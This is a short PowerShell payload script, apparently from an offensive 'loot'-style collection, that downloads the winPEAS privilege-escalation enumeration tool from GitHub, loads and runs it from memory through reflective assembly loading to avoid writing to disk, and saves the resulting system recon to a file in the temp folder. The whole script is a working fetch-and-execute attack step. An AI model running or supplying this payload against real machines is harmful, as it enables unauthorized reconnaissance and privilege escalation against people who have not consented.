# MAKE LOOT FOLDER
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"

# Get latest release
$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"

# Setup to execute winPEASany from memory in a PS shell
function winpea{$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")}
$WP = winpea

#Run winpeas and out it to file
echo "Treasure map:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $WP >> $env:TMP\$FileName
